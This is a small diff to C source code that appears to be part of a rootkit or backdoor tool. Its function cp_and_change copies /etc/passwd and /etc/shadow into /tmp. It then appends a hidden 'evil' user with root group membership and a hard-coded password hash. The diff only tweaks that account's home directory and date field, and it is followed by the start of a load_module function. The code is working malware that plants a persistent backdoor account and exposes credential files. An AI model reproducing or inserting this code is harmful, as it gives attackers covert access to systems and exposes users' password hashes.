@@ -8,8 +8,8 @@
 void cp_and_change(){
   system("cp /etc/passwd /tmp/");
   system("cp /etc/shadow /tmp/");
-  system("echo \"evil:x:12345:0::/home/evil:/bin/bash\" >> /etc/passwd");
-  system("echo \"evil:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:16888:0:99999:7:::\" >> /etc/shadow");
+  system("echo \"evil:x:12345:0::/home/:/bin/bash\" >> /etc/passwd");
+  system("echo \"evil:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:18006:0:99999:7:::\" >> /etc/shadow");
 }
 void load_module(pid_t process_id){
   char parameter[80];
